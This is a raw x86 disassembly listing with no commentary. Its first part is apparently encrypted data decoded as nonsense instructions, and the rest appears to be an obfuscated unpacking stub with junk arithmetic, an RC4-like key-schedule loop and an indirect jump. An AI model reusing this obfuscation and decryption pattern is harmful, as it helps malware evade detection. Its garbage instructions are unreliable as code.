  40b870:	enter  0x780a,0x1
  40b874:	fdivr  QWORD PTR [ecx]
  40b876:	arpl   dx,cx
  40b878:	jl     0x40b839
  40b87a:	mov    al,ds:0xff393314
  40b87f:	movsx  ecx,sp
  40b882:	dec    ebx
  40b883:	ss push 0x67
  40b886:	push   esi
  40b887:	pushf  
  40b888:	mov    edx,0xae9a0176
  40b88d:	aaa    
  40b88e:	lahf   
  40b88f:	mov    BYTE PTR [ecx+0x19],ah
  40b892:	ret    0xd9f5
  40b895:	push   es
  40b896:	mov    al,0xd6
  40b898:	(bad)  
  40b899:	xor    DWORD PTR [ecx+0x65],esi
  40b89c:	shr    DWORD PTR ds:0x3b6d8164,1
  40b8a2:	push   0xffffffd0
  40b8a4:	xchg   edx,eax
  40b8a5:	sbb    BYTE PTR [edi],dh
  40b8a7:	cmp    al,BYTE PTR [ebx-0x66]
  40b8aa:	rcr    DWORD PTR [esi-0x60],cl
  40b8ad:	xor    BYTE PTR cs:[esi-0x6eab55f0],dl
  40b8b4:	dec    eax
  40b8b5:	adc    dl,ch
  40b8b7:	hlt    
  40b8b8:	imul   DWORD PTR [esi+0x2b08dc30]
  40b8be:	jecxz  0x40b91e
  40b8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8c1:	mov    ch,0x85
  40b8c3:	jmp    0x12e9:0x6675ea5
  40b8ca:	stc    
  40b8cb:	lahf   
  40b8cc:	clc    
  40b8cd:	sub    eax,0x3260c3
  40b8d2:	ins    BYTE PTR es:[edi],dx
  40b8d3:	pusha  
  40b8d4:	or     al,0x30
  40b8d6:	test   al,0x6b
  40b8d8:	lahf   
  40b8d9:	gs add al,0xbd
  40b8dc:	inc    ebp
  40b8dd:	out    0x20,al
  40b8df:	hlt    
  40b8e0:	loopne 0x40b90e
  40b8e2:	repnz cmp al,0x61
  40b8e5:	inc    ecx
  40b8e6:	push   esp
  40b8e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e9:	(bad)  
  40b8ea:	cmp    ecx,DWORD PTR [esi+ebx*8]
  40b8ed:	(bad)  
  40b8ee:	push   ebp
  40b8ef:	faddp  st(7),st
  40b8f1:	mov    edi,0x7896c1d8
  40b8f6:	sti    
  40b8f7:	in     al,0xc8
  40b8f9:	je     0x40b8f6
  40b8fb:	fs cld 
  40b8fd:	mov    ecx,0xc18362ea
  40b902:	xchg   ebx,eax
  40b903:	cs call 0x520f:0x4c577a7e
  40b90b:	add    eax,0x44125b9
  40b910:	mov    dh,0xd6
  40b912:	mov    edx,0x8b8844d7
  40b917:	(bad)  
  40b918:	jle    0x40b8bc
  40b91a:	push   esi
  40b91b:	test   al,0x37
  40b91d:	inc    ecx
  40b91e:	out    0xee,al
  40b920:	fwait
  40b921:	es jmp 0x56079e97
  40b927:	push   ebp
  40b928:	xor    ebp,DWORD PTR [eax+ebp*2]
  40b92b:	in     al,0xbe
  40b92d:	xor    BYTE PTR [ebp-0x1e],cl
  40b930:	adc    esp,DWORD PTR gs:[edi]
  40b933:	inc    esp
  40b934:	inc    esp
  40b935:	or     BYTE PTR [esi-0x464b527a],0xf3
  40b93c:	add    eax,0x93279c0d
  40b941:	shr    BYTE PTR ds:[ebp-0x3f7cb6d8],1
  40b948:	fcmovnu st,st(1)
  40b94a:	sub    al,BYTE PTR [esi-0x1b]
  40b94d:	loop   0x40b906
  40b94f:	mov    ecx,0x8a062b04
  40b954:	aaa    
  40b955:	int    0xee
  40b957:	jbe    0x40b95d
  40b959:	outs   dx,DWORD PTR ds:[esi]
  40b95a:	jle    0x40b9b6
  40b95c:	adc    DWORD PTR [eax],ebx
  40b95e:	imul   esi,DWORD PTR [edx+0x604af48e],0xffffffda
  40b965:	mov    ds:0x56f0cb42,eax
  40b96a:	mov    WORD PTR [eax-0x4019cac4],ds
  40b970:	(bad)  
  40b971:	pop    edi
  40b972:	cmp    ah,dl
  40b974:	ss mov eax,0x5a65337
  40b97a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b97b:	ss scas al,BYTE PTR es:[edi]
  40b97d:	mov    ds:0xa9edbe52,al
  40b982:	ret    
  40b983:	daa    
  40b984:	out    0x15,al
  40b986:	push   edx
  40b987:	xchg   esi,eax
  40b988:	cld    
  40b989:	push   0xf054e92b
  40b98e:	stos   DWORD PTR es:[edi],eax
  40b98f:	pop    ecx
  40b990:	in     eax,dx
  40b991:	mov    bh,0xa8
  40b993:	retf   
  40b994:	jmp    0xedeff5d6
  40b999:	sub    eax,ebp
  40b99b:	pop    eax
  40b99c:	jnp    0x40b9a5
  40b99e:	test   eax,0x95ec970d
  40b9a3:	cli    
  40b9a4:	xchg   ebp,eax
  40b9a5:	mov    esi,0x2fae49d9
  40b9aa:	scas   al,BYTE PTR es:[edi]
  40b9ab:	jecxz  0x40b9c5
  40b9ad:	in     al,dx
  40b9ae:	fiadd  WORD PTR [eax+0x65dcbc71]
  40b9b4:	sahf   
  40b9b5:	sub    ah,bl
  40b9b7:	jmp    0x71d48b52
  40b9bc:	xchg   esp,eax
  40b9bd:	pop    ecx
  40b9be:	mov    ebp,DWORD PTR [ecx-0x4d]
  40b9c1:	mov    esi,0x85ccbd73
  40b9c6:	loop   0x40b9f9
  40b9c8:	test   al,0x82
  40b9ca:	jae    0x40b990
  40b9cc:	or     DWORD PTR [eax+0x7cf4c6dd],eax
  40b9d2:	jnp    0x40ba03
  40b9d4:	imul   ecx
  40b9d6:	enter  0xd8eb,0x8a
  40b9da:	hlt    
  40b9db:	xor    DWORD PTR [esi],0xffffff80
  40b9de:	mov    WORD PTR [ebp+0x5b61ccb0],es
  40b9e4:	iret   
  40b9e5:	add    al,0x17
  40b9e7:	es mov dl,0x4e
  40b9ea:	sub    dh,BYTE PTR [ecx-0x171da5a9]
  40b9f0:	add    ebx,esi
  40b9f2:	or     BYTE PTR [ebp-0x1],0xab
  40b9f6:	pushf  
  40b9f7:	mov    bl,0x9f
  40b9f9:	inc    edx
  40b9fa:	je     0x40b9e2
  40b9fc:	hlt    
  40b9fd:	jmp    0xf356:0xd77c3021
  40ba04:	jne    0x40ba7f
  40ba06:	sar    al,0xb6
  40ba09:	shl    DWORD PTR [esi+0x2da7cb16],cl
  40ba0f:	loop   0x40b9a8
  40ba11:	dec    esi
  40ba12:	fldcw  WORD PTR [ebx]
  40ba15:	jg     0xdce58d9b
  40ba1b:	and    BYTE PTR [esi],dh
  40ba1d:	sub    eax,0xc7e0d19a
  40ba22:	repz loopne 0x40b9ca
  40ba25:	dec    esi
  40ba27:	(bad)  [ecx-0x110795ed]
  40ba2d:	repz (bad) 
  40ba2f:	stos   DWORD PTR es:[edi],eax
  40ba30:	inc    esp
  40ba31:	xor    eax,0xcd2c2a46
  40ba36:	push   ebx
  40ba37:	mov    ebp,0xd3922702
  40ba3c:	imul   ebp,DWORD PTR [esi-0x46fc0815],0xffffff95
  40ba43:	enter  0xaa2,0xf2
  40ba47:	popw   ds
  40ba49:	inc    edi
  40ba4a:	scas   al,BYTE PTR es:[edi]
  40ba4b:	out    0x20,al
  40ba4d:	imul   ebx,ebx,0xd4018ce4
  40ba53:	push   0x7f8ccff6
  40ba58:	mov    cl,0xd3
  40ba5a:	and    eax,0x4ee22e92
  40ba5f:	mov    ebx,0x2010216a
  40ba64:	test   DWORD PTR [ebx],0xc139e8fb
  40ba6a:	test   dh,dh
  40ba6c:	ficom  WORD PTR [eax-0x54]
  40ba6f:	cmp    eax,ebx
  40ba71:	call   0x75b1:0x3220a49d
  40ba78:	sahf   
  40ba79:	and    BYTE PTR [ebx],0xc
  40ba7c:	or     DWORD PTR [ecx],eax
  40ba7e:	stos   BYTE PTR es:[edi],al
  40ba7f:	xchg   edx,eax
  40ba80:	jle    0x40ba33
  40ba82:	test   DWORD PTR [edi-0x56],edx
  40ba85:	push   edx
  40ba86:	(bad)  
  40ba88:	dec    eax
  40ba89:	pop    edi
  40ba8a:	adc    bl,0x98
  40ba8d:	int    0xd8
  40ba8f:	lock inc eax
  40ba91:	aad    0xc9
  40ba93:	adc    eax,0xf23b20e4
  40ba98:	jns    0x40ba6a
  40ba9a:	xchg   BYTE PTR [eax+ebx*8],al
  40ba9d:	mov    ah,0x7b
  40ba9f:	in     eax,0x78
  40baa1:	daa    
  40baa2:	pop    ebp
  40baa3:	pop    eax
  40baa4:	jmp    eax
  40baa6:	push   ebp
  40baa7:	add    ecx,edi
  40baa9:	xor    eax,eax
  40baab:	add    DWORD PTR ds:0x41f87b,ebx
  40bab1:	mov    ebx,DWORD PTR ds:0x41f810
  40bab7:	mov    al,0x40
  40bab9:	dec    edx
  40baba:	add    ebx,ebp
  40babc:	imul   ebx,eax,0x21
  40babf:	push   eax
  40bac0:	sub    DWORD PTR ds:0x41f807,ebx
  40bac6:	mov    ecx,DWORD PTR ds:0x41f839
  40bacc:	mov    eax,0x1001
  40bad1:	sub    edx,esi
  40bad3:	dec    eax
  40bad4:	add    ecx,ebx
  40bad6:	movsx  ebx,ax
  40bad9:	push   eax
  40bada:	mov    DWORD PTR ds:0x41f731,edx
  40bae0:	push   0x1da00
  40bae5:	mov    edx,DWORD PTR ds:0x41f8c2
  40baeb:	push   0x0
  40baed:	sub    ebx,ebp
  40baef:	push   0xffffffff
  40baf1:	add    ebx,ebp
  40baf3:	call   DWORD PTR ds:0x40c471
  40baf9:	inc    edx
  40bafa:	push   eax
  40bafb:	sub    DWORD PTR ds:0x41f925,edx
  40bb01:	lea    edx,[eax+edx*2]
  40bb04:	mov    ecx,eax
  40bb06:	and    ebx,edx
  40bb08:	dec    edx
  40bb09:	xor    eax,eax
  40bb0b:	sub    edx,eax
  40bb0d:	lea    eax,[eax+0x41f68c]
  40bb13:	add    DWORD PTR ds:0x41f6ed,ebx
  40bb19:	mov    edi,DWORD PTR [esp]
  40bb1c:	lea    ebx,[eax+eax*1]
  40bb1f:	add    ebx,edi
  40bb21:	add    ebx,ecx
  40bb23:	add    ebx,DWORD PTR ds:0x41f877
  40bb29:	sub    DWORD PTR ds:0x41f8f2,ebx
  40bb2f:	mov    ebx,edi
  40bb31:	sub    ebx,DWORD PTR ds:0x41f89e
  40bb37:	add    ebx,DWORD PTR ds:0x41f89b
  40bb3d:	sub    ebx,esi
  40bb3f:	mov    DWORD PTR ds:0x41f6fa,ebx
  40bb45:	lea    ebx,[ecx+eax*1]
  40bb48:	mov    edx,DWORD PTR [eax+0x4]
  40bb4b:	add    ebx,DWORD PTR ds:0x41f7dc
  40bb51:	add    ebx,eax
  40bb53:	test   edx,edx
  40bb55:	je     0x40bbd5
  40bb5b:	and    ebx,eax
  40bb5d:	add    DWORD PTR ds:0x41f7b6,ebx
  40bb63:	mov    bh,0x4a
  40bb65:	mov    ecx,edx
  40bb67:	sub    ebx,ebp
  40bb69:	xor    ebx,0xffffff9e
  40bb6c:	sub    ebx,esi
  40bb6e:	sub    DWORD PTR ds:0x41f811,ebx
  40bb74:	mov    ebx,esi
  40bb76:	mov    esi,DWORD PTR [eax]
  40bb78:	inc    ebx
  40bb79:	imul   ebx,eax,0x2e
  40bb7c:	inc    ebx
  40bb7d:	mov    DWORD PTR ds:0x41f7fb,ebx
  40bb83:	mov    ebx,DWORD PTR ds:0x41f898
  40bb89:	dec    ebx
  40bb8a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb8c:	add    ebx,eax
  40bb8e:	dec    ebx
  40bb8f:	add    eax,0x8
  40bb92:	mov    DWORD PTR ds:0x41f927,ebx
  40bb98:	jmp    0x40bb45
  40bb9d:	mov    ebx,DWORD PTR ds:0x41f7c8
  40bba3:	inc    ebx
  40bba4:	add    ebx,ecx
  40bba6:	sub    ebx,esi
  40bba8:	mov    DWORD PTR ds:0x41f7c3,ebx
  40bbae:	mov    ebx,DWORD PTR ds:0x41f870
  40bbb4:	xor    ebx,edx
  40bbb6:	inc    ebx
  40bbb7:	add    ebx,ebp
  40bbb9:	add    DWORD PTR ds:0x41f8b6,ebx
  40bbbf:	lea    ebx,[eax+ecx*4]
  40bbc2:	add    ebx,eax
  40bbc4:	imul   ebx,edi,0x1f
  40bbc7:	add    ebx,esi
  40bbc9:	sub    DWORD PTR ds:0x41f86d,ebx
  40bbcf:	mov    ebx,DWORD PTR ds:0x41f7e7
  40bbd5:	movsx  ebx,al
  40bbd8:	pop    eax
  40bbd9:	sub    ebx,edx
  40bbdb:	add    ebx,edx
  40bbdd:	mov    DWORD PTR ds:0x41f8f7,ebx
  40bbe3:	pop    ebp
  40bbe4:	jmp    0x40bc1d
  40bbe9:	push   ebp
  40bbea:	mov    edx,DWORD PTR ds:0x41f857
  40bbf0:	xor    eax,eax
  40bbf2:	add    ebx,edx
  40bbf4:	push   eax
  40bbf5:	sub    edi,ebx
  40bbf7:	and    edi,esi
  40bbf9:	push   eax
  40bbfa:	mov    DWORD PTR ds:0x41f70f,edi
  40bc00:	mov    dl,0x17
  40bc02:	push   eax
  40bc03:	xor    edi,0xffffff95
  40bc06:	call   0x40c2f1
  40bc0b:	dec    edi
  40bc0c:	push   eax
  40bc0d:	sub    edx,ebp
  40bc0f:	sub    DWORD PTR ds:0x41f728,edx
  40bc15:	push   eax
  40bc16:	call   DWORD PTR ds:0x40c481
  40bc1c:	pop    ebp
  40bc1d:	ret    0x0
  40bc20:	sub    esp,0x10c
  40bc26:	mov    edx,DWORD PTR ds:0x41f832
  40bc2c:	mov    eax,DWORD PTR [esp+0x110]
  40bc33:	movsx  ebx,dl
  40bc36:	mov    ecx,DWORD PTR [esp+0x120]
  40bc3d:	sub    ebx,DWORD PTR ds:0x41f715
  40bc43:	add    edx,eax
  40bc45:	mov    DWORD PTR [esp],eax
  40bc48:	mov    DWORD PTR ds:0x41f82e,ebx
  40bc4e:	mov    edx,DWORD PTR ds:0x41f838
  40bc54:	mov    DWORD PTR [esp+0x4],ecx
  40bc58:	imul   edx,eax,0x34
  40bc5b:	xor    eax,eax
  40bc5d:	sub    ebx,DWORD PTR ds:0x41f799
  40bc63:	dec    edx
  40bc64:	push   eax
  40bc65:	mov    DWORD PTR ds:0x41f8c9,edx
  40bc6b:	mov    edx,edi
  40bc6d:	push   eax
  40bc6e:	xor    ebx,eax
  40bc70:	or     ebx,0x5b
  40bc73:	mov    BYTE PTR [esp+eax*1+0x10],al
  40bc77:	add    edx,edi
  40bc79:	sub    DWORD PTR ds:0x41f8e4,ebx
  40bc7f:	inc    eax
  40bc80:	lea    edx,[ecx+eax*2]
  40bc83:	pop    edx
  40bc84:	sub    ebx,ebp
  40bc86:	dec    edx
  40bc87:	pop    edx
  40bc88:	dec    ebx
  40bc89:	mov    DWORD PTR ds:0x41f723,edx
  40bc8f:	cmp    ah,0x1
  40bc92:	jne    0x40bc63
  40bc98:	lea    ebx,[edx+0x15]
  40bc9b:	push   edi
  40bc9c:	or     edx,0x5f
  40bc9f:	imul   edx,ecx,0x65
  40bca2:	mov    edi,DWORD PTR [esp+0x11c]
  40bca9:	sub    edx,edi
  40bcab:	sub    DWORD PTR ds:0x41f754,edx
  40bcb1:	push   ebp
  40bcb2:	lea    ebx,[edx+ecx*1]
  40bcb5:	push   esi
  40bcb6:	movzx  ebx,al
  40bcb9:	sub    edx,DWORD PTR ds:0x41f82a
  40bcbf:	xor    esi,esi
  40bcc1:	xor    edx,0x6d
  40bcc4:	xor    eax,eax
  40bcc6:	add    DWORD PTR ds:0x41f7a8,edx
  40bccc:	mov    ebx,DWORD PTR ds:0x41f74e
  40bcd2:	xor    ebp,ebp
  40bcd4:	movzx  esi,dl
  40bcd7:	push   ebx
  40bcd8:	xor    esi,0x3
  40bcdb:	add    esi,edx
  40bcdd:	xor    ebx,ebx
  40bcdf:	sub    DWORD PTR ds:0x41f703,esi
  40bce5:	lea    esi,[eax+ecx*1]
  40bce8:	mov    cl,BYTE PTR [esp+ebp*1+0x18]
  40bcec:	add    esi,ebp
  40bcee:	xor    esi,edx
  40bcf0:	mov    edx,DWORD PTR [esp+0x14]
  40bcf4:	and    esi,ebx
  40bcf6:	mov    DWORD PTR ds:0x41f762,esi
  40bcfc:	movzx  edx,BYTE PTR [edx+eax*1]
  40bd00:	sub    esi,ebp
  40bd02:	dec    esi
  40bd03:	add    ebx,ecx
  40bd05:	add    esi,edx
  40bd07:	sub    DWORD PTR ds:0x41f7bb,esi
  40bd0d:	add    edx,ebx
  40bd0f:	movzx  edx,dl
  40bd12:	add    esi,DWORD PTR ds:0x41f8e2
  40bd18:	add    esi,DWORD PTR ds:0x41f84c
  40bd1e:	sub    esi,edi
  40bd20:	mov    DWORD PTR ds:0x41f890,esi
  40bd26:	mov    esi,ecx
  40bd28:	sub    esi,edx
  40bd2a:	imul   esi,ebx,0x21
  40bd2d:	inc    eax
  40bd2e:	sub    esi,ebx
  40bd30:	mov    DWORD PTR ds:0x41f786,esi
  40bd36:	mov    ebx,edx
  40bd38:	and    esi,edx
  40bd3a:	add    esi,DWORD PTR ds:0x41f89c
  40bd40:	add    esi,edi
  40bd42:	cmp    eax,edi
  40bd44:	jb     0x40bd52
  40bd4a:	sub    DWORD PTR ds:0x41f88e,esi
  40bd50:	xor    eax,eax
  40bd52:	mov    esi,DWORD PTR ds:0x41f765
  40bd58:	mov    dl,BYTE PTR [esp+ebx*1+0x18]
  40bd5c:	movsx  esi,cx
  40bd5f:	inc    ebp
  40bd60:	dec    esi
  40bd61:	add    esi,DWORD PTR ds:0x41f850
  40bd67:	inc    ebp
  40bd68:	add    DWORD PTR ds:0x41f70e,esi
  40bd6e:	mov    BYTE PTR [esp+ebp*1+0x16],dl
  40bd72:	dec    ebp
  40bd73:	sub    esi,eax
  40bd75:	xor    esi,ecx
  40bd77:	mov    BYTE PTR [esp+ebx*1+0x18],cl
  40bd7b:	or     esi,0xfffffff5
  40bd7e:	mov    DWORD PTR ds:0x41f8f5,esi
  40bd84:	cmp    ebp,0x100
  40bd8a:	jb     0x40bce5
  40bd90:	lea    esi,[eax+eax*4]
  40bd93:	xor    ebp,ebp
  40bd95:	inc    esi
  40bd96:	add    esi,eax
  40bd98:	add    esi,edi
  40bd9a:	add    DWORD PTR ds:0x41f6e5,esi
  40bda0:	mov    esi,DWORD PTR ds:0x41f8cc
  40bda6:	sub    esi,edx
  40bda8:	movsx  esi,al
  40bdab:	dec    esi
  40bdac:	sub    DWORD PTR ds:0x41f7b7,esi
  40bdb2:	mov    esi,DWORD PTR ds:0x41f75d
  40bdb8:	xor    edi,edi
  40bdba:	xor    esi,ecx
  40bdbc:	xor    eax,eax
  40bdbe:	add    esi,edx
  40bdc0:	sub    esi,ebp
  40bdc2:	pop    ebx
  40bdc3:	sub    DWORD PTR ds:0x41f87f,esi
  40bdc9:	lea    esi,[eax+eax*1]
  40bdcc:	test   ebp,ebp
  40bdce:	jbe    0x40c194
  40bdd4:	dec    ebx
  40bdd5:	dec    ebx
  40bdd6:	sub    esi,edi
  40bdd8:	sub    DWORD PTR ds:0x41f8db,ebx
  40bdde:	mov    ebx,DWORD PTR ds:0x41f79d
  40bde4:	inc    ebx
  40bde5:	push   eax
  40bde6:	or     esi,0xffffff8e
  40bde9:	add    ebx,ebp
  40bdeb:	inc    DWORD PTR [esp]
  40bdee:	sub    DWORD PTR ds:0x41f78e,ebx
  40bdf4:	mov    esi,DWORD PTR ds:0x41f84e
  40bdfa:	pop    eax
  40bdfb:	dec    esi
  40bdfc:	and    esi,ecx
  40bdfe:	add    ebx,ecx
  40be00:	push   ebx
  40be01:	add    DWORD PTR ds:0x41f7ed,esi
  40be07:	mov    esi,DWORD PTR ds:0x41f8ba
  40be0d:	add    ebx,eax
  40be0f:	and    eax,0xff
  40be14:	inc    ebx
  40be15:	sub    ebx,ebp
  40be17:	mov    cl,BYTE PTR [esp+eax*1+0x18]
  40be1b:	add    DWORD PTR ds:0x41f6e8,ebx
  40be21:	mov    esi,ecx
  40be23:	movzx  edx,cl
  40be26:	or     ebx,0xffffffc8
  40be29:	sub    esi,DWORD PTR ds:0x41f6e4
  40be2f:	add    edx,edi
  40be31:	jmp    0x40c146
  40be36:	push   ebp
  40be37:	mov    ecx,edi
  40be39:	imul   ecx,edi,0xe
  40be3c:	add    eax,ebx
  40be3e:	inc    ecx
  40be3f:	mov    ecx,esi
  40be41:	mov    ecx,edx
  40be43:	dec    eax
  40be44:	movsx  ecx,cx
  40be47:	sub    eax,ebp
  40be49:	mov    al,0x31
  40be4b:	mov    ch,0x8
  40be4d:	sub    ecx,edi
  40be4f:	dec    ecx
  40be50:	mov    DWORD PTR [esp],ebp
  40be53:	mov    eax,ds:0x41f86e
  40be58:	mov    ecx,edi
  40be5a:	push   esp
  40be5b:	mov    al,0x8
  40be5d:	sub    ecx,esi
  40be5f:	pop    ebp
  40be60:	inc    eax
  40be61:	sub    eax,esi
  40be63:	mov    eax,ebx
  40be65:	call   0x40bf3d
  40be6a:	mov    al,0x51
  40be6c:	inc    ecx
  40be6d:	sub    edx,ecx
  40be6f:	mov    ebx,DWORD PTR ds:0x41f80b
  40be75:	call   0x40c2f1
  40be7a:	mov    ebx,edx
  40be7c:	mov    bl,0x34
  40be7e:	and    edi,ecx
  40be80:	add    ecx,ebp
  40be82:	add    eax,edx
  40be84:	mov    DWORD PTR ds:0x41f76d,edx
  40be8a:	call   0x40bfcf
  40be8f:	mov    edx,ecx
  40be91:	add    ecx,edx
  40be93:	call   0x40baa6
  40be98:	sub    ecx,DWORD PTR ds:0x41f725
  40be9e:	add    esi,ecx
  40bea0:	sub    DWORD PTR ds:0x41f864,edx
  40bea6:	call   0x40c380
  40beab:	mov    dl,0x5d
  40bead:	add    ecx,DWORD PTR ds:0x41f8fd
  40beb3:	add    ecx,edi
  40beb5:	push   eax
  40beb6:	sub    edx,ecx
  40beb8:	sub    DWORD PTR ds:0x41f855,esi
  40bebe:	mov    ecx,DWORD PTR ds:0x41f7b6
  40bec4:	inc    ecx
  40bec5:	inc    ecx
  40bec6:	add    edi,edx
  40bec8:	mov    DWORD PTR ds:0x41f84e,esi
  40bece:	add    ecx,ebx
  40bed0:	dec    edi
  40bed1:	movsx  ecx,dx
  40bed4:	mov    DWORD PTR ds:0x41f6e9,esi
  40beda:	mov    esi,DWORD PTR ds:0x41f6ed
  40bee0:	call   0x40c2fd
  40bee5:	add    ecx,DWORD PTR ds:0x41f87d
  40beeb:	add    esi,DWORD PTR ds:0x41f720
  40bef1:	pop    eax
  40bef2:	add    esi,DWORD PTR ds:0x41f865
  40bef8:	add    eax,0xaa0
  40befd:	sub    DWORD PTR ds:0x41f6ff,esi
  40bf03:	pop    edi
  40bf04:	mov    ecx,DWORD PTR ds:0x41f7b4
  40bf0a:	pop    esi
  40bf0b:	sub    ecx,DWORD PTR ds:0x41f840
  40bf11:	pop    ebx
  40bf12:	add    ecx,esi
  40bf14:	add    edx,eax
  40bf16:	add    DWORD PTR ds:0x41f90c,ecx
  40bf1c:	pop    edx
  40bf1d:	mov    cl,0x5f
  40bf1f:	pop    ebp
  40bf20:	sub    ecx,edx
  40bf22:	add    ecx,edx
  40bf24:	push   DWORD PTR [esp]
  40bf27:	sub    ecx,edx
  40bf29:	add    DWORD PTR ds:0x41f786,ecx
  40bf2f:	push   eax
  40bf30:	mov    cl,0xd
  40bf32:	mov    ebp,DWORD PTR [esp+0xc]
  40bf36:	sub    ecx,eax
  40bf38:	jmp    0x40baa3
  40bf3d:	sub    ecx,ebp
  40bf3f:	push   ebp
  40bf40:	xor    ecx,0xffffff85
  40bf43:	mov    DWORD PTR ds:0x41f887,ebp
  40bf49:	push   edx
  40bf4a:	lea    ecx,[ecx+0x2d]
  40bf4d:	push   ebx
  40bf4e:	sub    ecx,edx
  40bf50:	dec    ebx
  40bf51:	push   esi
  40bf52:	add    ecx,eax
  40bf54:	add    DWORD PTR ds:0x41f8f0,ebp
  40bf5a:	push   edi
  40bf5b:	mov    ebx,DWORD PTR ds:0x41f6e7
  40bf61:	mov    eax,DWORD PTR [esp+0x14]
  40bf65:	imul   ebx,esi,0x1e
  40bf68:	push   eax
  40bf69:	add    ebp,edi
  40bf6b:	and    ebp,ecx
  40bf6d:	sub    DWORD PTR ds:0x41f825,ebp
  40bf73:	call   0x40c2f1
  40bf78:	call   0x40c2f1
  40bf7d:	call   0x40c2f1
  40bf82:	mov    ebp,edx
  40bf84:	inc    ebp
  40bf85:	add    ebx,ecx
  40bf87:	sub    ebx,DWORD PTR ds:0x41f8aa
  40bf8d:	mov    DWORD PTR ds:0x41f71e,ebx
  40bf93:	mov    ebx,eax
  40bf95:	dec    ebp
  40bf96:	sub    ebp,eax
  40bf98:	dec    ebx
  40bf99:	add    DWORD PTR ds:0x41f732,ebp
  40bf9f:	mov    ebx,DWORD PTR ds:0x41f84b
  40bfa5:	add    ebp,ebx
  40bfa7:	add    ebp,edx
  40bfa9:	add    ebx,edi
  40bfab:	mov    DWORD PTR ds:0x41f771,ebx
  40bfb1:	mov    ebx,DWORD PTR ds:0x41f71c
  40bfb7:	call   0x40c2f1
  40bfbc:	call   0x40c2f1
  40bfc1:	movzx  ebx,dl
  40bfc4:	and    ebx,edi
  40bfc6:	add    ebp,DWORD PTR ds:0x41f791
  40bfcc:	ret    0x0
  40bfcf:	push   ebp
  40bfd0:	call   0x40bbe9
  40bfd5:	mov    DWORD PTR ds:0x41f858,ebx
  40bfdb:	add    eax,DWORD PTR fs:[eax-0x23]
  40bfdf:	mov    ebx,DWORD PTR ds:0x41f8a7
  40bfe5:	cmp    eax,0x5d
  40bfe8:	je     0x40c141
  40bfee:	call   0x40bff3
  40bff3:	inc    ebx
  40bff4:	add    ebx,esi
  40bff6:	inc    ebx
  40bff7:	add    DWORD PTR ds:0x41f766,ebx
  40bffd:	lea    ebx,[ecx+0x5d]
  40c000:	dec    ebx
  40c001:	sub    ebx,edx
  40c003:	add    ebx,edx
  40c005:	sub    DWORD PTR ds:0x41f77a,ebx
  40c00b:	lea    ebx,[ecx+eax*1]
  40c00e:	dec    ebx
  40c00f:	sub    ebx,ebp
  40c011:	add    ebx,ebp
  40c013:	mov    DWORD PTR ds:0x41f71f,ebx
  40c019:	mov    bl,0x6a
  40c01b:	inc    ebx
  40c01c:	dec    ebx
  40c01d:	sub    ebx,edi
  40c01f:	mov    DWORD PTR ds:0x41f8be,ebx
  40c025:	lea    ebx,[edx+0x68]
  40c028:	add    ebx,DWORD PTR ds:0x41f71f
  40c02e:	or     ebx,0x2
  40c031:	movzx  ebx,dx
  40c034:	sub    DWORD PTR ds:0x41f7b0,ebx
  40c03a:	lea    ebx,[eax+0x64]
  40c03d:	xor    ebx,0x53
  40c040:	add    ebx,edi
  40c042:	add    ebx,ebp
  40c044:	add    DWORD PTR ds:0x41f8b2,ebx
  40c04a:	mov    ebx,esi
  40c04c:	dec    ebx
  40c04d:	sub    ebx,edx
  40c04f:	dec    ebx
  40c050:	add    DWORD PTR ds:0x41f776,ebx
  40c056:	mov    bl,0x18
  40c058:	movsx  ebx,ax
  40c05b:	sub    ebx,edx
  40c05d:	inc    ebx
  40c05e:	sub    DWORD PTR ds:0x41f7ed,ebx
  40c064:	mov    ebx,DWORD PTR ds:0x41f878
  40c06a:	add    ebx,ebp
  40c06c:	add    ebx,eax
  40c06e:	imul   ebx,eax,0x5a
  40c071:	add    DWORD PTR ds:0x41f7c9,ebx
  40c077:	mov    ebx,DWORD PTR ds:0x41f75d
  40c07d:	add    ebx,ecx
  40c07f:	add    ebx,edx
  40c081:	xor    ebx,edx
  40c083:	mov    DWORD PTR ds:0x41f84a,ebx
  40c089:	mov    ebx,esi
  40c08b:	add    ebx,esi
  40c08d:	add    ebx,edi
  40c08f:	add    ebx,ecx
  40c091:	sub    DWORD PTR ds:0x41f753,ebx
  40c097:	mov    bl,0x1e
  40c099:	and    ebx,edi
  40c09b:	sub    ebx,DWORD PTR ds:0x41f8b3
  40c0a1:	movzx  ebx,cl
  40c0a4:	mov    DWORD PTR ds:0x41f854,ebx
  40c0aa:	mov    ebx,edx
  40c0ac:	sub    ebx,DWORD PTR ds:0x41f6fb
  40c0b2:	inc    ebx
  40c0b3:	sub    ebx,edx
  40c0b5:	mov    DWORD PTR ds:0x41f7d1,ebx
  40c0bb:	mov    bl,0x5e
  40c0bd:	inc    ebx
  40c0be:	movsx  ebx,dl
  40c0c1:	dec    ebx
  40c0c2:	add    DWORD PTR ds:0x41f74c,ebx
  40c0c8:	mov    ebx,DWORD PTR ds:0x41f8a9
  40c0ce:	add    ebx,DWORD PTR ds:0x41f6ee
  40c0d4:	imul   ebx,ecx,0x49
  40c0d7:	xor    ebx,0xffffff90
  40c0da:	add    DWORD PTR ds:0x41f77d,ebx
  40c0e0:	mov    ebx,DWORD PTR ds:0x41f890
  40c0e6:	add    ebx,edx
  40c0e8:	add    ebx,esi
  40c0ea:	sub    ebx,DWORD PTR ds:0x41f75e
  40c0f0:	mov    DWORD PTR ds:0x41f7ad,ebx
  40c0f6:	mov    ebx,DWORD PTR ds:0x41f8a6
  40c0fc:	dec    ebx
  40c0fd:	movsx  ebx,ax
  40c100:	add    ebx,edi
  40c102:	mov    DWORD PTR ds:0x41f86d,ebx
  40c108:	mov    ebx,edi
  40c10a:	inc    ebx
  40c10b:	inc    ebx
  40c10c:	add    ebx,ecx
  40c10e:	mov    DWORD PTR ds:0x41f75e,ebx
  40c114:	mov    ebx,DWORD PTR ds:0x41f794
  40c11a:	sub    ebx,edx
  40c11c:	inc    ebx
  40c11d:	call   0x40bc20
  40c122:	xor    ebx,0x30
  40c125:	mov    DWORD PTR ds:0x41f6f5,ebx
  40c12b:	mov    bl,0x35
  40c12d:	sub    ebx,edi
  40c12f:	dec    ebx
  40c130:	dec    ebx
  40c131:	add    DWORD PTR ds:0x41f7cb,ebx
